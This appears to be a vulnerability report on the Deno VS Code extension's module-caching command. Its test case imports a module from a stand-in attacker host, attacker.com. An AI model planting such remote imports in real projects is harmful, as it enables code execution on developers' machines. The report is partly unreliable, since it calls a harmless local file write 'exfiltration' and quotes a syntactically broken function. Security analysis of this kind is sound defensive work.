# Vulnerabilities

### 1. Unrestricted Execution of Attacker-Controlled Remote JavaScript Modules

- **Description**:
  - The extension provides a command `Deno: Cache` which allows users to fetch and cache remote JavaScript modules (via URLs).
  - A user can execute the command by opening a project file within VSCode, and the extension automatically fetches all dependencies from remote URLs mentioned in the file.
  - By default, the command does not restrict or validate the fetched modules' sources, assuming that the user fully trusts all URLs in their project files.
  - A malicious actor could exploit this by:
    1. Hosting JavaScript or TypeScript code on an attacker-controlled remote server.
    2. Encouraging or tricking a victim user to import this malicious remote module URL or dependency into their Deno project file.
    3. When the user runs "Deno: Cache" in VSCode (or uses the quick-fix autocomplete offered by the extension), the malicious module is fetched and cached locally.
    4. Later execution or use of this cached module by the user could cause arbitrary JavaScript/TypeScript code execution within their development environment, potentially providing remote code execution (RCE).

- **Impact**:
  - This vulnerability enables arbitrary attacker-controlled code execution within the user's development environment with the privileges of the VSCode application and the user running it.
  - Attackers could access sensitive local data, perform malicious operations on the user's system, steal development secrets (API keys, credentials, personal or private information in source code), alter source code, or compromise the user's local development and testing infrastructure.

- **Vulnerability Rank**:
  - **High**

- **Currently Implemented Mitigations**:
  - Users are shown an informational message warning when enabling import completion from remote domains the first time the origin is encountered (`createRegistryStateHandler` in `notification_handlers.ts`):
    ```typescript
    if (suggestions) {
        const selection = await vscode.window.showInformationMessage(
          `The server "${origin}" supports completion suggestions for imports. Do you wish to enable this?
          (Only do this if you trust "${origin}")`,
          "No",
          "Enable",
        );
    ```
  - This mitigates some cases by avoiding unsolicited auto-completion from unknown sources.

- **Missing Mitigations**:
  - The project currently does not verify or enforce reputation and trust over the imported URLs before caching them.
  - There is no built-in mechanism that prohibits execution of JavaScript fetched from untrusted external sources or warning the user explicitly about modules pulled from less trusted domains after the initial interaction.
  - Absence of integrity checks (e.g., subresource integrity hashes) for cached modules.
  - No sandboxing/isolation for fetched cached JavaScript modules.

- **Preconditions**:
  - An attacker-controlled remote module URL is successfully introduced into the user's development files.
  - The victim executes the Deno module fetching mechanism ("Deno: Cache" via command palette or extension autocomplete quick-fix feature).

- **Source Code Analysis**:
  - Current logic in `commands.ts` file, particularly in the `"deno.client.cacheActiveDocument"` command registers the `deno.cache` command upon the user's request:
    ```typescript
    export function cacheActiveDocument{
      return () => {
        const activeEditor = vscode.window.activeTextEditor;
        const uri = activeEditor.document.uri.toString();
        return vscode.window.withProgress({
          location: vscode.ProgressLocation.Window,
          title: "caching",
        }, () => {
          return vscode.commands.executeCommand("deno.cache", [uri], uri);
        });
      };
    }
    ```
  - This logic directly calls `deno.cache` without performing thorough validation beyond the basic domain trust prompt. Thus, it executes without strong protections when invoked directly by the user.
  - The extension allows for locally cached JavaScript code, which will (according to Deno CLI mechanisms) potentially execute within the user's local environment when importing or running Deno projects.

- **Security Test Case**:
  1. Attacker hosts malicious JavaScript code at an attacker-controlled domain: `https://attacker.com/malicious_lib.js`:
     ```js
     export const exploit = () => {
       Deno.writeTextFileSync("/tmp/stolen_data.txt", "Sensitive Data Exfiltrated");
     };
     ```
  2. Victim creates a new Deno JavaScript project in Visual Studio Code, importing the malicious library:
     ```typescript
     import { exploit } from "https://attacker.com/malicious_lib.js";

     exploit();
     ```
  3. The victim runs VSCode with the Deno extension enabled. Executing "Deno: Cache" (invoked from the VS Code command palette) for the active file will fetch and cache the malicious library onto the local filesystem.
  4. Running the code either via manual run (`deno run`) or in the VS Code dev environment causes immediate execution of attacker-controlled code, writing sensitive data from the victim's environment to the filesystem.
  5. Observe in `/tmp/stolen_data.txt` that the attacker now triggers local data exfiltration without the user's consent.

  **This demonstrates a valid attack scenario via remote JavaScript module caching and unsecured local execution, validating this vulnerability.**
